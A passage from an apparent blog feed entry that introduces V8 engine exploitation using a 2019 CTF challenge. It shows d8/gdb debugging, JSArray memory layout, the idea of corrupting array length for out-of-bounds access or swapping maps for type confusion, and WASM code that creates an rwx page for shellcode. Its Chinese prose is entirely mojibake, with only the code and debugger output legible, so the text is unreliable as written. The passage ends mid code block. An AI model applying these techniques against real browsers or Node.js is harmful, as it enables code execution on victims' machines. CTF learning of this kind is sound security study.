é€’é‚£äº›ä¸–äººçš†çŸ¥çš„äº‹-è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘ (tencent.com)</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>åˆæ¢v8æ¼æ´åˆ©ç”¨</title>
      <link href="/2024/05/05/v8start/"/>
      <url>/2024/05/05/v8start/</url>
      
        <content type="html"><![CDATA[<p>ä¸€ç›´è§‰å¾— <code>v8</code> æ¼æ´åˆ©ç”¨æ˜¯ä¸€ä»¶éå¸¸å¥½ç©çš„äº‹æƒ…ï¼Œæ‰€ä»¥æ‰¾æ—¶é—´å…¥é—¨äº†ä¸€ä¸‹ï¼Œè¿™ç¯‡åšå®¢æ‰€ä½¿ç”¨çš„ç¯å¢ƒæ˜¯ <code>*CTF 2019</code> çš„ <code>oob</code>ï¼Œç›¸å…³é™„ä»¶è¯»è€…å¯ä»¥è‡ªè¡Œä¸Šç½‘æœç´¢ä¸‹è½½ã€‚è¿™ç¯‡åšå®¢ä¸»è¦ç”¨äºæ€»ç»“æœ¬äººåœ¨å…¥é—¨ <code>v8</code> æ¼æ´åˆ©ç”¨æ—¶æ‰€å­¦åˆ°çš„ä¸œè¥¿ï¼Œç”±äº <code>Qanux</code> åˆèœåˆçˆ±ç©ï¼Œæ–‡ç« ä¸å…å­˜åœ¨è®¸å¤šçš„é—®é¢˜ï¼Œè¯·è¯»è€…å¤šå¤šåŒ…å®¹  </p><h1 id="åŸºæœ¬æ¦‚å¿µ"><a href="#åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="åŸºæœ¬æ¦‚å¿µ"></a>åŸºæœ¬æ¦‚å¿µ</h1><p>åœ¨å¼€å§‹ä¹‹å‰ï¼Œè‚¯å®šæœ‰å¾ˆå¤šäººæƒ³é—® v8 æ˜¯ä¸€ä¸ªä»€ä¹ˆä¸œè¥¿ï¼Œä¸‹é¢æ˜¯åœ¨çŸ¥ä¹ä¸­æœåˆ°çš„å¯¹äº v8 çš„æè¿°ï¼š  </p><blockquote><p>V8å¼•æ“æ˜¯ç”±C++ç¼–å†™çš„Googleå¼€æºé«˜æ€§èƒ½JavaScriptå’ŒWebAssemblyå¼•æ“ï¼Œå®ƒç”¨äºChromeå’ŒNode.jsç­‰ã€‚<br>V8å¯ä»¥ç‹¬ç«‹è¿è¡Œï¼Œä¹Ÿå¯ä»¥åµŒå…¥åˆ°ä»»ä½•C++åº”ç”¨ç¨‹åºä¸­ã€‚<br>V8æ”¯æŒä¼—å¤šæ“ä½œç³»ç»Ÿï¼Œå¦‚Windowsã€linuxã€androidç­‰ï¼Œä¹Ÿæ”¯æŒå…¶ä»–ç¡¬ä»¶æ¶æ„ï¼Œå¦‚IA32,X64,ARMç­‰ï¼Œå…·æœ‰å¾ˆå¥½çš„å¯ç§»æ¤å’Œè·¨å¹³å°ç‰¹æ€§ã€‚  </p></blockquote><p>ä½œä¸º <code>js</code> å¼•æ“ï¼Œ<code>V8</code> ä¼šç¼–è¯‘ &#x2F; æ‰§è¡Œ <code>JavaScript</code> ä»£ç ï¼Œç®¡ç†å†…å­˜ï¼Œè´Ÿè´£åƒåœ¾å›æ”¶ï¼Œä¸å®¿ä¸»è¯­è¨€çš„äº¤äº’ç­‰ã€‚é€šè¿‡æš´éœ²å®¿ä¸»å¯¹è±¡ (å˜é‡ï¼Œå‡½æ•°ç­‰) åˆ° <code>JavaScript</code>ï¼Œ<code>JavaScript</code> å¯ä»¥è®¿é—®å®¿ä¸»ç¯å¢ƒä¸­çš„å¯¹è±¡ï¼Œå¹¶åœ¨è„šæœ¬ä¸­å®Œæˆå¯¹å®¿ä¸»å¯¹è±¡çš„æ“ä½œã€‚<br>æ¥ä¸‹æ¥çœ‹çœ‹ <code>v8</code> å·¥ä½œåŸç†çš„ç®€åŒ–ç»†åˆ†ï¼š  </p><img src="/2024/05/05/v8start/1.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å½“ <code>Chrome</code> æˆ– <code>Node.js</code> éœ€è¦æ‰§è¡Œä¸€æ®µ <code>JavaScript</code> ä»£ç æ—¶ï¼Œå®ƒä¼šå°†æºä»£ç ä¼ é€’ç»™ <code>V8</code>ã€‚<code>V8</code> å°† <code>JavaScript</code> æºä»£ç é€å…¥æ‰€è°“çš„è§£æå™¨ (<code>Parser</code>)ï¼Œè§£æå™¨ä¸ºæºä»£ç åˆ›å»ºä¸€ä¸ªæŠ½è±¡è¯­æ³•æ ‘ (<code>AST</code>) è¡¨ç¤ºã€‚<code>AST</code> éšåè¢«ä¼ é€’ç»™æ–°å¼•å…¥çš„ <code>Ignition</code> è§£é‡Šå™¨ï¼Œåœ¨é‚£é‡Œå®ƒè¢«è½¬æ¢æˆä¸€ç³»åˆ—å­—èŠ‚ç ã€‚ç„¶åï¼Œ<code>Ignition</code> æ‰§è¡Œè¿™ä¸ªå­—èŠ‚ç åºåˆ—ã€‚<br>åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œ<code>Ignition</code> æ”¶é›†äº†æœ‰å…³æŸäº›æ“ä½œè¾“å…¥çš„å‰–æä¿¡æ¯æˆ–åé¦ˆã€‚å…¶ä¸­ä¸€äº›åé¦ˆè¢« <code>Ignition</code> è‡ªèº«ç”¨æ¥åŠ é€Ÿåç»­çš„å­—èŠ‚ç è§£é‡Šã€‚ä¾‹å¦‚ï¼Œå¯¹äºå±æ€§è®¿é—®ï¼Œå¦‚æœåœ¨æ‰€æœ‰æ—¶é—´éƒ½å…·æœ‰ç›¸åŒçš„å½¢çŠ¶ (å³ä½ æ€»æ˜¯ä¸ºå±æ€§aä¼ é€’ä¸€ä¸ªå€¼ï¼Œå…¶ä¸­ <code>a</code> æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²)ï¼Œæˆ‘ä»¬ä¼šç¼“å­˜å¦‚ä½•è·å– <code>a</code> å€¼çš„ä¿¡æ¯ã€‚åœ¨åç»­æ‰§è¡Œç›¸åŒçš„å­—èŠ‚ç æ—¶ï¼Œæˆ‘ä»¬ä¸éœ€è¦å†æ¬¡æœç´¢aã€‚è¿™é‡Œçš„åº•å±‚æœºåˆ¶ç§°ä¸ºå†…è”ç¼“å­˜ (<code>IC</code>)ã€‚  </p><p>æ¥ä¸‹æ¥å†èŠèŠä»€ä¹ˆæ˜¯ <code>d8</code>ã€‚<code>d8</code> æ˜¯ä¸€ä¸ªéå¸¸æœ‰ç”¨çš„è°ƒè¯•å·¥å…·ï¼Œä½ å¯ä»¥æŠŠå®ƒçœ‹æˆæ˜¯ <code>debug for V8</code> çš„ç¼©å†™ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>d8</code> æ¥æŸ¥çœ‹ <code>V8</code> åœ¨æ‰§è¡Œ <code>JavaScript</code> è¿‡ç¨‹ä¸­çš„å„ç§ä¸­é—´æ•°æ®ï¼Œæ¯”å¦‚ä½œç”¨åŸŸã€ASTã€å­—èŠ‚ç ã€ä¼˜åŒ–çš„äºŒè¿›åˆ¶ä»£ç ã€åƒåœ¾å›æ”¶çš„çŠ¶æ€ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ <code>d8</code> æä¾›çš„ç§æœ‰ <code>API</code> æŸ¥çœ‹ä¸€äº›å†…éƒ¨ä¿¡æ¯ã€‚  </p><h1 id="èµ°è¿›v8"><a href="#èµ°è¿›v8" class="headerlink" title="èµ°è¿›v8"></a>èµ°è¿›v8</h1><p>æœ¬æ¥æƒ³å†™å†™å¦‚ä½•é…ç½® <code>v8</code> ç¯å¢ƒçš„ï¼Œå¯æ˜¯ç½‘ä¸Šç›¸å…³èµ„æ–™å¤ªå¤šäº†ï¼ŒåŠ ä¸Šç¬”è€…æ¯”è¾ƒæ‡’ï¼Œå°±æ²¡å†™ï¼Œç­‰å“ªå¤©å¿ƒè¡€æ¥æ½®å†è¡¥ä¸Šå§  </p><h2 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h2><p>åœ¨ç»™ <code>gdb</code> é…ç½®å¥½ <code>v8</code> çš„è°ƒè¯•æ–‡ä»¶åï¼Œå³å¯åˆ©ç”¨å¦‚ä¸‹å‘½ä»¤æ¥è°ƒè¯•æˆ‘ä»¬çš„ <code>JavaScript</code> ä»£ç ï¼š  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb ./d8</span><br><span class="line">r --allow-natives-syntax --shell ./exp.js</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè§£é‡Šä¸€ä¸‹å‘½ä»¤é‡Œé¢çš„å‡ ä¸ªå‚æ•°ï¼š  </p><ul><li>â€“allow-natives-syntaxï¼šå¼€å¯åŸç”Ÿ <code>API</code> (ç”¨çš„æ¯”è¾ƒå¤š)  </li><li>â€“shellï¼šè¿è¡Œè„šæœ¬ååˆ‡å…¥äº¤äº’æ¨¡å¼</li></ul><p>åœ¨è°ƒè¯•çš„è¿‡ç¨‹ä¸­æˆ‘ä»¬å¯ä»¥åœ¨ä»£ç ä¸­åŠ å…¥å¦‚ä¸‹ä»£ç æ¥è¿›è¡Œè°ƒè¯•ï¼š  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%<span class="title class_">DebugPrint</span>(obj);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ <code>%DebugPrint(obj);</code> ä½œç”¨ä¸ºæ‰“å°å¯¹è±¡çš„ä¿¡æ¯ (<code>debug</code> ç‰ˆæœ¬çš„ <code>d8</code> å¯ä»¥æ‰“å°å¯¹è±¡çš„è¯¦ç»†ä¿¡æ¯ï¼Œè€Œ <code>release</code> ç‰ˆæœ¬çš„ <code>d8</code> åªä¼šæ‰“å°å¯¹è±¡ç±»å‹å’Œå¯¹è±¡çš„åœ°å€)ï¼Œ<code>%SystemBreak();</code> çš„ä½œç”¨ç±»ä¼¼äºæ–­ç‚¹<br>ç”±äºæ ‡å‡†çš„ <code>JavaScript</code> å¹¶ä¸æ”¯æŒä»¥ä¸Šè¯­æ³•ï¼Œæ‰€ä»¥åœ¨è¿è¡Œæ—¶è¦åŠ ä¸Š <code>--allow-natives-syntax</code> é€‰é¡¹<br>ç°åœ¨ä½¿ç”¨å¦‚ä¸‹ä»£ç æ¥è¿›è¡Œæµ‹è¯•ï¼š  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p>å¯åŠ¨æ•ˆæœå¦‚ä¸‹ï¼š  </p><img src="/2024/05/05/v8start/2.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯ä»¥çœ‹è§æ‰“å°å‡ºäº†è¿™ä¸ªæ•´æ•°æ•°ç»„çš„åœ°å€ï¼Œç”±äºæˆ‘è¿™ä¸ª <code>d8</code> æ˜¯ <code>release</code> ç‰ˆæœ¬ï¼Œæ‰€ä»¥å¹¶æ²¡æœ‰æ‰“å°å‡ºè¯¥æ•°ç»„å¯¹è±¡çš„è¯¦ç»†ä¿¡æ¯ï¼Œä½†æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>job</code> å‘½ä»¤æ¥è¾¾åˆ°ç›¸åŒçš„æ•ˆæœ  </p><img src="/2024/05/05/v8start/3.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>è¿™é‡Œæœ‰ä¸ªéœ€è¦æ³¨æ„çš„ç‚¹ï¼Œé‚£å°±æ˜¯ <code>DebugPrint</code> æ‰“å°å‡ºæ¥çš„æ˜¯çœŸå®åœ°å€åŠ ä¸€ï¼Œè€Œ <code>job</code> å‘½ä»¤åé¢æ¥ç€çš„ä¹Ÿéœ€è¦æ˜¯ <code>object</code> çš„çœŸå®åœ°å€åŠ ä¸€ï¼Œä¸ç„¶ä¼šè¢«è§£ææˆ <code>smi</code> ç±»å‹  </p><h2 id="v8-objectçš„åŸºæœ¬ç»“æ„"><a href="#v8-objectçš„åŸºæœ¬ç»“æ„" class="headerlink" title="v8 objectçš„åŸºæœ¬ç»“æ„"></a>v8 objectçš„åŸºæœ¬ç»“æ„</h2><p>é¦–å…ˆç»™å‡º <code>object</code> çš„é€šç”¨ç»“æ„ï¼š  </p><img src="/2024/05/05/v8start/4.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>ä¸åŒå¯¹è±¡çš„ <code>object</code> ç»“æ„éƒ½ä¼šä¸ä¸€æ ·ï¼Œä½†æ˜¯éƒ½æœ‰å¾ˆå¤šç›¸ä¼¼ä¹‹å¤„ï¼Œç°åœ¨å°±æ¥è¯¦ç»†åˆ†æä¸Šé¢ç»™å‡ºçš„ä¾‹å­ï¼Œä¸ºäº†é˜²æ­¢å¿˜è®°ï¼Œè¿™é‡Œå†æ¬¡è´´å‡ºä»£ç ï¼š  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p>è¿˜æ˜¯ç»™å‡ºä¸€æ ·çš„ç»“æœï¼š  </p><img src="/2024/05/05/v8start/3.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯ä»¥çœ‹å‡ºè¯¥å¯¹è±¡ä¸º <code>JSArray</code>ï¼Œå…¶ç»“æ„å’Œ <code>object</code> çš„é€šç”¨ç»“æ„å·®ä¸å¤šï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰ä¸€ç‚¹ç‚¹åŒºåˆ«<br>ä¸‹é¢æ˜¯ <code>JSArray</code> çš„ç»“æ„å›¾ï¼š</p><img src="/2024/05/05/v8start/5.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å…¶å„ä¸ªå­—æ®µçš„å«ä¹‰å¤§è‡´å¦‚ä¸‹ï¼š  </p><ul><li>mapï¼šå®šä¹‰äº†å¦‚ä½•è®¿é—®å¯¹è±¡ï¼Œå…·æœ‰ç›¸åŒ <code>Map</code> çš„ä¸¤ä¸ª <code>JS object</code> ï¼Œå°±ä»£è¡¨å…·æœ‰ç›¸åŒçš„ç±»å‹ï¼ˆå³å…·æœ‰ä»¥ç›¸åŒé¡ºåºå‘½åçš„ç›¸åŒå±æ€§ï¼‰ï¼Œæ¯”è¾ƒ Map çš„åœ°å€å³å¯ç¡®å®šç±»å‹æ˜¯å¦â¼€è‡´ï¼ŒåŒç†ï¼Œæ›¿æ¢æ‰ Map å°±å¯ä»¥è¿›è¡Œç±»å‹æ··æ·†ã€‚  </li><li>prototypeï¼šå¯¹è±¡çš„åŸå‹ï¼ˆå¦‚æœæœ‰ï¼‰ </li><li>elementsï¼šå¯¹è±¡çš„åœ°å€  </li><li>lengthï¼šé•¿åº¦</li></ul><p>æˆ‘ä»¬å¯ä»¥åœ¨ <code>gdb</code> ä¸­æŸ¥çœ‹ <code>elements</code>  </p><img src="/2024/05/05/v8start/6.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯ä»¥çœ‹è§ <code>elements</code> ä¸­çš„æ•°æ®ä¹Ÿåˆ†ä¸º <code>3</code> å±‚ï¼Œåˆ†åˆ«ä¸º <code>map</code> æŒ‡é’ˆã€<code>length</code>ã€<code>data</code><br>è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªéœ€è¦æ³¨æ„çš„åœ°æ–¹ï¼Œé‚£å°±æ˜¯ <code>elements</code> çš„åœ°å€æ˜¯åœ¨ <code>object</code> çš„ä¸Šæ–¹çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ç¨‹åºåœ¨ç”³è¯·ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œæ˜¯å…ˆå‘å †ç”³è¯·ä¸€å—ç©ºé—´ç”¨äºå­˜å‚¨å¯¹è±¡çš„æ•°æ®ï¼Œå†ç”³è¯·ä¸€å—ç©ºé—´ç”¨äºç®¡ç†è¯¥å¯¹è±¡ã€‚è™½ç„¶ <code>elements</code> æ˜¯åœ¨ obj ä¸Šä¸Šæ–¹ï¼Œä½†è¿™å¹¶ä¸ä»£è¡¨ <code>elements</code> å°±ä¸€å®šç´§è´´ç€ <code>obj</code>ï¼Œè¿™ä¸ªé—®é¢˜æˆ‘æ‰“ç®—ç•™åˆ°åé¢å†è®²<br>å¥½åƒç›¸å…³ç»“æ„äº†è§£åˆ°è¿™é‡Œå°±å·®ä¸å¤šäº†ï¼Œå¦‚æœåé¢è¿˜æœ‰åˆ«çš„é‚£å°±å†è¡¥è¡¥å§ï¼ˆç¬‘  </p><h2 id="v8æ¼æ´åˆ©ç”¨æ€æƒ³"><a href="#v8æ¼æ´åˆ©ç”¨æ€æƒ³" class="headerlink" title="v8æ¼æ´åˆ©ç”¨æ€æƒ³"></a>v8æ¼æ´åˆ©ç”¨æ€æƒ³</h2><p>é€šè¿‡ä¸Šé¢å¯¹ <code>object</code> ç»“æ„çš„åˆ†æï¼Œä¹Ÿè®¸æœ‰äººå·²ç»çŸ¥é“è¿›è¡Œæ¼æ´çš„åˆ©ç”¨äº†ã€‚å¯ä»¥çŒœæµ‹æˆ‘ä»¬å¯¹ä¸€ä¸ªå¯¹è±¡è¿›è¡Œè®¿é—®æ—¶ä¸‹æ ‡çš„æœ€å¤§å€¼æ˜¯ç”± <code>elements</code> ä¸Šçš„ <code>length</code> æ‰€å†³å®šçš„ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥ä¿®æ”¹è¿™ä¸ª <code>length</code> ä¸ºä¸€ä¸ªå¾ˆå¤§çš„å€¼ï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿåšåˆ°è¶Šç•Œè¯»å†™ã€‚åŒæ—¶ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥ä¿®æ”¹ <code>obj</code> ä¸­çš„ <code>map</code>ï¼Œæˆ‘ä»¬ä»¤å…¶å‡ºç°ç¥å¥‡çš„æ•ˆæœï¼Œå…·ä½“åœ¨ä¸‹é¢æ¼æ´åˆ©ç”¨ä¸­å†åˆ†æ<br>åœ¨å¹³æ—¶çš„ <code>CTF</code> é¢˜ç›®ä¸­æˆ‘ä»¬çš„ç›®çš„æ˜¯å¦‚ä½•è®©ç¨‹åºæ‰§è¡Œ <code>system(&quot;/bin/sh&quot;)</code>ï¼Œè€Œåœ¨ <code>v8</code> ä¸­ï¼Œæˆ‘ä»¬çš„ç›®çš„æ˜¯è®© v8 ä»»æ„æ‰§è¡Œæˆ‘ä»¬çš„ <code>shellcode</code><br>ç„¶è€Œå®ç°è¿™ä¸€åˆ‡éœ€è¦ä¸€ä¸ªå‰æï¼Œé‚£å°±æ˜¯éœ€è¦å­˜åœ¨ <code>rwx</code> æƒé™çš„åŒºåŸŸã€‚è¿™æ—¶å€™å°±éœ€è¦ <code>WASM</code> ç™»åœºäº†<br>ä»€ä¹ˆæ˜¯ <code>WASM</code>ï¼Ÿé¡¾åæ€ä¹‰ï¼Œæ˜¯ <code>Asm on the web</code>ï¼Œä½†å…¶å®ä¸æ˜¯çœŸæ­£æ„ä¹‰ä¸Šçš„æ±‡ç¼–ï¼Œåªæ˜¯æ›´åŠ æ¥è¿‘æ±‡ç¼–ã€‚<code>WASM</code> å¯ä»¥åœ¨ <code>Javascript Engine</code> çš„åœ°å€ç©ºé—´ä¸­å¯¼å…¥ä¸€å—å¯è¯»å¯å†™å¯æ‰§è¡Œçš„å†…å­˜é¡µã€‚<br>ä¸‹é¢çœ‹çœ‹è¿™ä¸€æ®µä»£ç ï¼š  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>,</span><br><span class="line">    <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>,</span><br><span class="line">    <span class="number">42</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasm_mod = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(<span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code));</span><br><span class="line"><span class="keyword">let</span> f = wasm_mod.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(wasm_mod);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(f);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p>ç»“æœï¼š  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">0x0d1dfcf5f731 &lt;Instance map = 0x1ccbe5f49789&gt;</span><br><span class="line">0x0d1dfcf5f929 &lt;JSFunction 0 (sfi = 0xd1dfcf5f8f1)&gt;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x0d1dfcf5f731</span><br><span class="line">0xd1dfcf5f731: [WasmInstanceObject] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x1ccbe5f49789 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x23f8cbe0ac19 &lt;Object map = 0x1ccbe5f4abd9&gt;</span><br><span class="line"> - elements: 0x0cb6b4d40c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - module_object: 0x23f8cbe10fb1 &lt;Module map = 0x1ccbe5f491e9&gt;</span><br><span class="line"> - exports_object: 0x23f8cbe111e9 &lt;Object map = 0x1ccbe5f4ad19&gt;</span><br><span class="line"> - native_context: 0x0d1dfcf41869 &lt;NativeContext[246]&gt;</span><br><span class="line"> - memory_object: 0x0d1dfcf5f859 &lt;Memory map = 0x1ccbe5f4a189&gt;</span><br><span class="line"> - table 0: 0x23f8cbe11181 &lt;Table map = 0x1ccbe5f49aa9&gt;</span><br><span class="line"> - imported_function_refs: 0x0cb6b4d40c71 &lt;FixedArray[0]&gt;</span><br><span class="line"> - managed_native_allocations: 0x23f8cbe11129 &lt;Foreign&gt;</span><br><span class="line"> - memory_start: 0x7f9440280000</span><br><span class="line"> - memory_size: 65536</span><br><span class="line"> - memory_mask: ffff</span><br><span class="line"> - imported_function_targets: 0x55ab193567e0</span><br><span class="line"> - globals_start: (nil)</span><br><span class="line"> - imported_mutable_globals: 0x55ab19356800</span><br><span class="line"> - indirect_function_table_size: 0</span><br><span class="line"> - indirect_function_table_sig_ids: (nil)</span><br><span class="line"> - indirect_function_table_targets: (nil)</span><br><span class="line"> - properties: 0x0cb6b4d40c71 &lt;FixedArray[0]&gt; &#123;&#125;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x0d1dfcf5f929</span><br><span class="line">0xd1dfcf5f929: [Function] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x1ccbe5f44379 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x0d1dfcf42109 &lt;JSFunction (sfi = 0xe9259bc3b29)&gt;</span><br><span class="line"> - elements: 0x0cb6b4d40c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - <span class="keyword">function</span> prototype: &lt;no-prototype-slot&gt;</span><br><span class="line"> - shared_info: 0x0d1dfcf5f8f1 &lt;SharedFunctionInfo 0&gt;</span><br><span class="line"> - name: 0x0cb6b4d44ae1 &lt;String[<span class="comment">#1]: 0&gt;</span></span><br><span class="line"> - formal_parameter_count: 0</span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - context: 0x0d1dfcf41869 &lt;NativeContext[246]&gt;</span><br><span class="line"> - code: 0x323b6e002001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - WASM instance 0xd1dfcf5f731</span><br><span class="line"> - WASM <span class="keyword">function</span> index 0</span><br><span class="line"> - properties: 0x0cb6b4d40c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    <span class="comment">#length: 0x0e9259bc04b9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line">    <span class="comment">#name: 0x0e9259bc0449 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line">    <span class="comment">#arguments: 0x0e9259bc0369 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line">    <span class="comment">#caller: 0x0e9259bc03d9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> - feedback vector: not available</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹è§æ­¤æ—¶å†…å­˜å·²ç»å‡ºç°äº†æ‹¥æœ‰ <code>rwx</code> æƒé™çš„åŒºåŸŸ</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">0xfb58ac2e000      0xfb58ac2f000 rwxp     1000      0 [anon_fb58ac2e]</span><br></pre></td></tr></table></figure><p>ç°åœ¨çš„é—®é¢˜æ˜¯æˆ‘ä»¬è¦å¦‚ä½•è·å–åˆ°è¿™ä¸ªå†…å­˜åŒºåŸŸçš„åœ°å€ï¼Œæˆ‘ä»¬æ¥æŸ¥çœ‹ä¸€ä¸‹ <code>f</code> çš„ <code>shared_info</code> ç»“æ„çš„ä¿¡æ¯ï¼š  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 